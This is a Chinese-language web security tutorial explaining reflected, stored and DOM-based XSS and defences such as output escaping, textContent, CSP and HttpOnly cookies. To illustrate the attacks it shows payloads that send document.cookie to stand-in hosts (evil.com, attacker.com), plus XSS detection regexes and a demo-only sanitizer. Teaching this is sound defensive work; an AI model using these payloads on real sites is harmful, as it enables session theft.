# XSS —— 反射型、存储型、DOM 型，防御（转义、CSP）

## 什么是 XSS

XSS（Cross-Site Scripting，跨站脚本）的本质，是**信任的错位**——浏览器信任了不该信任的内容来源。

想象一个场景：你开了一家餐厅，菜单上写着"今日推荐"。有一天，有人偷偷在菜单上加了一行字："顺便把你的钱包交给我"。服务员照单念了出来。这就是 XSS——本应展示的内容里混入了可执行指令。

在 Web 世界中，XSS 攻击者将恶意脚本注入到页面中，当其他用户访问这个被污染的页面时，这些脚本就会在受害者的浏览器中执行。攻击者可以窃取 Cookie、劫持会话、篡改内容、甚至控制用户行为。

```javascript
// 一个典型的 XSS 注入示例
// 攻击者在评论框中输入：
const maliciousInput = '<img src=x onerror="document.location=`http://evil.com/steal?c=${document.cookie}`">';

// 如果服务器直接把这个字符串插入到 HTML 中：
// <div class="comment">{maliciousInput}</div>
// 浏览器就会执行 onerror 中的 JavaScript
```

这段代码利用了 `<img>` 标签的 `onerror` 属性——`src=x` 必定加载失败，触发 `onerror` 回调，恶意代码随之运行。这不是什么高深的技术，而是一个简单的"偷梁换柱"：把数据伪装成代码。

## 三种 XSS 类型

### 反射型 XSS

反射型 XSS 的名字很形象——恶意代码像光线遇到镜子一样，从服务器"反射"回客户端。

**原理**：用户点击一个包含恶意参数的链接，服务器将该参数原样嵌入响应页面中返回。恶意代码随页面一起到达浏览器并执行。

```javascript
// URL 中携带恶意参数
// https://example.com/search?q=<script>stealCookie()</script>

// 服务端代码（危险写法）：
app.get('/search', (req, res) => {
  // 直接拼接用户输入到 HTML 中
  res.send(`<h1>搜索结果：${req.query.q}</h1>`);
});
```

这就像你去银行柜台办事，柜员问你办什么业务，你说了一句"把钱全部转走"，柜员居然真的照做了。问题不在于你的话本身有威力，而在于系统没有区分"指令"与"内容"。

**特点**：
- 恶意代码存在于 URL 参数中
- 需要受害者主动点击恶意链接
- 不持久化，每次都需要诱导用户访问特定 URL

**生活类比**：有人在传话游戏中夹带了私货——"告诉小明，老师说今天放学后去办公室"这句话里藏了假消息。传话的人（服务器）只是忠实地转述了内容，但听者（浏览器）却把整句话都当真了。

### 存储型 XSS

存储型 XSS 比反射型更危险，因为它是**持久化的**。恶意代码被存储在服务端数据库中，每次页面加载都会触发。

```javascript
// 攻击者在评论区提交：
const storedPayload = `
  <script>
    fetch('https://attacker.com/collect', {
      method: 'POST',
      body: document.cookie,
    });
  </script>
`;

// 服务端存入数据库后，每个查看该评论的用户都会触发：
// <div class="comment-body">{storedPayload}</div>
```

存储型 XSS 是三种类型中最具破坏力的。它不需要反复诱导用户点击链接，一旦注入成功，所有访问该页面的用户都是潜在受害者。

**特点**：
- 恶意代码存储在服务端（数据库、文件系统等）
- 影响范围广，所有访客都可能受影响
- 持续生效，直到管理员发现并清除

**哲学思考**：存储型 XSS 揭示了一个深刻的软件工程命题——**输入与输出的时间解耦**。数据进入系统的时刻和离开系统的时刻之间可能隔着很长的时间窗口，安全检查如果只做在入口处，出口处的风险就会被忽略。就像一封信寄出时没问题，但收件人拆信时信封里已经换了内容。安全的本质不是单点的守卫，而是全链路的审视。

### DOM 型 XSS

DOM 型 XSS 与前两种不同，它的 payload **不会经过服务器**，而是纯粹在前端 DOM 操作中完成注入。

```javascript
// 危险的 DOM 操作
function showHash() {
  const hash = location.hash.slice(1);
  // 直接将 hash 写入 innerHTML
  document.getElementById('output').innerHTML =
    `欢迎回来，${hash}`;
}

// 攻击构造的 URL：
// https://example.com/page#<img src=x onerror=alert(1)>
```

注意这里的微妙之处：即使服务端做了完美的输出转义，DOM 型 XSS 照样可以发生。因为污染发生在浏览器端，服务端对此完全无感知。

```javascript
// 更隐蔽的 DOM XSS —— 通过 JavaScript source 触发
function updateGreeting() {
  // location.href 是危险的 "source"
  const name = new URL(location.href).searchParams.get('name');
  // innerHTML 是危险的 "sink"
  document.querySelector('.greeting').innerHTML = `Hello, ${name}`;
}
```

**Source 和 Sink 模型**是理解 DOM XSS 的核心框架：

| Source（危险源） | Sink（危险汇聚点） |
|-----------------|-------------------|
| `location.href` | `element.innerHTML` |
| `location.search` | `document.write()` |
| `location.hash` | `eval()` |
| `document.URL` | `setTimeout(string)` |
| `document.referrer` | `Function()` 构造函数 |
| `window.name` | `.outerHTML` |

**哲学思考**：DOM 型 XSS 提醒我们，**信任边界不仅存在于客户端与服务端之间，同样存在于用户输入与 DOM 渲染之间**。前端开发者常常认为"我已经让后端过滤过了"，这种思维本身就是一种危险的委托。每一层都应该有自己的防线，因为每一层的失效都不应该成为灾难的起点。

## XSS 防御策略

### 输出编码（转义）

最根本的防御手段是对动态内容进行**上下文相关的编码**。不同的 HTML 上下文需要不同的转义规则：

```javascript
/**
 * HTML 实体编码 —— 用于插入 HTML 内容区域
 * 将特殊字符转为对应的 HTML 实体
 */
function escapeHtml(str) {
  const escapeMap = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;',
  };
  return String(str).replace(/[&<>"'\/]/g, (char) => escapeMap[char]);
}

// 使用示例
const userInput = '<script>alert("XSS")</script>';
const safeOutput = escapeHtml(userInput);
// 结果: &lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;
// 渲染为纯文字，不会被执行
```

```javascript
/**
 * JavaScript 转义 —— 用于插入 JS 字符串上下文
 * 注意：尽量避免往 JS 上下文中插入动态值
 */
function escapeJs(str) {
  return String(str)
    .replace(/\\/g, '\\\\')
    .replace(/'/g, "\\'")
    .replace(/"/g, '\\"')
    .replace(/\n/g, '\\n')
    .replace(/\r/g, '\\r');
}

/**
 * URL 编码 —— 用于插入 href/src 等属性
 * 但要注意 javascript: 协议的处理
 */
function escapeUrl(str) {
  const encoded = encodeURIComponent(str);
  // 检测并阻止 javascript: 协议
  if (/^javascript\s*:/i.test(encoded)) return '#unsafe';
  return encoded;
}

/**
 * CSS 转义 —— 尽量避免动态生成 CSS
 */
function escapeCss(str) {
  return String(str).replace(/[^a-zA-Z0-9]/g, (char) => {
    return `\\${char.charCodeAt(0).toString(16)} `;
  });
}
```

**核心原则**：转义必须在**输出时**进行，而不是输入时。原因很简单——同一段数据可能在不同上下文中使用，输入时的转义无法预知输出的环境。

### 使用安全的 API

避免使用 `innerHTML` 这类危险的 API，改用安全的替代方案：

```javascript
// ❌ 危险 —— innerHTML 会解析并执行其中的 HTML 标签
element.innerHTML = userInput;

// ✅ 安全 —— textContent 只作为纯文字处理
element.textContent = userInput;

// ✅ 安全 —— 创建 DOM 节点再赋值
const span = document.createElement('span');
span.textContent = userInput;
element.appendChild(span);

// ❌ 危险 —— document.write 会解析 HTML
document.write(userInput);

// ✅ 安全 —— 使用 DOM API 构建
const div = document.createElement('div');
div.textContent = userInput;
document.body.appendChild(div);
```

**哲学思考**：`innerHTML` 和 `textContent` 的区别不仅是技术层面的，更是**语义层面**的。前者说"这是一段标记语言，请解析它"；后者说"这是内容，请显示它"。大多数情况下我们只需要后者。选择更精确表达意图的 API，本质上是在缩小系统的攻击面——你不需要的能力，就不应该暴露给调用者。

### Content Security Policy（CSP）

CSP 是 HTTP 响应头，用于限制页面可以加载哪些资源。它是防御 XSS 的**最后一道防线**——即使攻击者成功注入了脚本，CSP 也可能阻止其执行。

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.trusted.com; object-src 'none'
```

```javascript
// 在 Node.js / Express 中设置 CSP 头
const helmet = require('helmet');

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", 'cdn.example.com'],
    styleSrc: ["'self'", "'unsafe-inline'"],  // 开发阶段可能需要
    imgSrc: ["'self'", 'data:', 'https:'],
    connectSrc: ["'self'", 'api.example.com'],
    fontSrc: ["'self'", 'fonts.gstatic.com'],
    objectSrc: ["'none'"],          // 禁止 Flash 等插件
    frameAncestors: ["'none'"],     // 防止被嵌套
    baseUri: ["'self'"],            // 限制 <base> 标签
    formAction: ["'self'"],         // 限制表单提交目标
    upgradeInsecureRequests: [],    // 强制 HTTPS
  },
}));
```

CSP 的各条指令含义如下：

| 指令 | 控制范围 | 说明 |
|------|---------|------|
| `default-src` | 默认策略 | 其他指令未覆盖时的兜底规则 |
| `script-src` | JavaScript | 允许哪些来源的脚本 |
| `style-src` | CSS 样式表 | 允许哪些来源的样式 |
| `img-src` | 图片 | 允许哪些来源的图片 |
| `connect-src` | AJAX/WebSocket | 允许请求哪些地址 |
| `font-src` | 字体文件 | 允许哪些来源的字体 |
| `object-src` | 插件对象 | Flash、Java Applet 等 |
| `frame-ancestors` | 父页面 | 谁可以将当前页面嵌入 iframe |

**nonce 和 hash** 是 CSP 中精细控制内联脚本的两种方式：

```html
<!-- 方式一：使用 nonce（一次性随机数） -->
<!-- 服务器在每个响应中生成不同的 nonce -->
<script nonce="EDNnf03nceIOfn39fn3e9h3sdfa">
  // 这个内联脚本可以执行，因为 nonce 匹配
</script>
<script>
  // 没有 nonce 或 nonce 不匹配 → 被阻止！
</script>

<!-- 方式二：使用 script hash -->
<!-- CSP: script-src 'sha256-B2yPHKaXnvFWtRChIbabYrUBCh7EFkYQV8UZ25dBiVE=' -->
<script>
  console.log('Hello!');
</script>
<!-- 只要内容不变，hash 就匹配，脚本允许执行 -->
<!-- 任何篡改都会导致 hash 不匹配而被拦截 -->
```

### HttpOnly Cookie

虽然 HttpOnly 不能防止 XSS 本身发生，但它能**阻断 XSS 最常见的攻击路径**——窃取 Cookie：

```javascript
// 设置 HttpOnly Cookie（服务端）
res.setHeader('Set-Cookie', [
  'session_id=abc123',
  'Path=/',
  'HttpOnly',        // JavaScript 无法通过 document.cookie 访问
  'Secure',          // 仅 HTTPS 传输
  'SameSite=Strict', // 防止跨站请求携带
].join('; '));

// 前端尝试读取：
console.log(document.cookie);
// 输出中不包含 session_id，因为 HttpOnly 标记使其对 JS 不可见
```

## 综合防御体系

单一防御手段永远不够。真正的安全来自于**纵深防御（Defense in Depth）**——多层防护相互叠加，任何一层被突破都不会导致全面崩溃。

```javascript
/**
 * 安全工具类 —— 整合多种防御手段
 */
class SecurityUtil {
  /**
   * 安全地渲染用户内容到 DOM
   * @param {HTMLElement} element 目标元素
   * @param {string} content 用户提供的内容
   * @param {'text'|'html'} mode 渲染模式
   */
  static render(element, content, mode = 'text') {
    switch (mode) {
      case 'text':
        element.textContent = content;
        break;
      case 'html':
        // 仅在明确需要时使用，且必须先转义
        element.innerHTML = this.sanitize(content);
        break;
      default:
        throw new Error(`Unknown render mode: ${mode}`);
    }
  }

  /**
   * 基于 allowlist 的 HTML 清理
   * 只保留白名单中的标签和属性
   * 生产环境建议使用 DOMPurify 库
   */
  static sanitize(dirty) {
    // 简易实现 —— 仅作演示，生产请用 DOMPurify
    const allowedTags = new Set([
      'p', 'br', 'b', 'i', 'em', 'strong',
      'a', 'ul', 'ol', 'li', 'code', 'pre',
    ]);
    const allowedAttrs = new Set(['href', 'target', 'rel']);

    const temp = document.createElement('div');
    temp.textContent = ''; // 初始化

    // 使用 DOMParser 解析
    const doc = new DOMParser().parseFromString(dirty, 'text/html');

    // 递归清理节点
    function clean(node) {
      const children = Array.from(node.childNodes);
      for (const child of children) {
        if (child.nodeType === Node.ELEMENT_NODE) {
          if (!allowedTags.has(child.tagName.toLowerCase())) {
            // 不在白名单中，移除节点（保留子节点）
            while (child.firstChild) {
              node.insertBefore(child.firstChild, child);
            }
            node.removeChild(child);
          } else {
            // 移除不在白名单中的属性
            for (const attr of Array.from(child.attributes)) {
              if (!allowedAttrs.has(attr.name.toLowerCase())) {
                child.removeAttribute(attr.name);
              }
            }
            clean(child); // 递归处理子节点
          }
        }
      }
    }

    clean(doc.body);
    return doc.body.innerHTML;
  }

  /**
   * 检测潜在的 XSS payload（客户端辅助检测）
   * 注意：服务端验证才是可靠的
   */
  static detectXSSPatterns(input) {
    const patterns = [
      /<script\b[\s\S]*?<\/script>/gi,       // script 标签
      /on\w+\s*=\s*["'][^"']*["']/gi,        // 事件处理器
      /javascript\s*:/gi,                      // javascript: 协议
      /expression\s*\(/gi,                     // CSS expression
      /<iframe[\s\S]*?>/gi,                   // iframe 标签
    ];

    for (const pattern of patterns) {
      if (pattern.test(input)) {
        return { safe: false, matched: pattern.source };
      }
    }
    return { safe: true };
  }
}

// 使用示例
SecurityUtil.render(
  document.getElementById('comment'),
  userComment,
  'text'
);

const checkResult = SecurityUtil.detectXSSPatterns(inputValue);
if (!checkResult.safe) {
  console.warn('检测到可疑内容模式:', checkResult.matched);
}
```

**哲学思考**：安全不是一个状态，而是一种**持续的对抗过程**。每当你修补了一道漏洞，攻击者就在寻找下一条路。XSS 的存在提醒我们：Web 从未被设计成一个安全的执行环境——HTML 最初只是文档标记语言，JavaScript 只是用来做简单交互的小脚本。随着它们承担的责任越来越重，历史遗留的设计缺陷就成了安全隐患。理解这些缺陷的本质，比记住每一种具体的攻击方式更有价值。

## XSS 与其他安全问题的关系

XSS 常常与其他安全问题形成**攻击链**。例如，XSS 可以配合 [CSRF](/frontend/javascript/browser-api/csrf) 实现更复杂的攻击——先用 XSS 窃取用户的 CSRF Token，再用该 Token 发起伪造请求。也可以配合[点击劫持](/frontend/javascript/browser-api/clickjacking)，通过透明 iframe 隐藏恶意页面的真实行为。

了解 XSS 是构建完整 Web 安全认知的第一步。它教会我们一个永恒的道理：**不要信任任何来自外部的数据，直到你用正确的方式确认过它**。
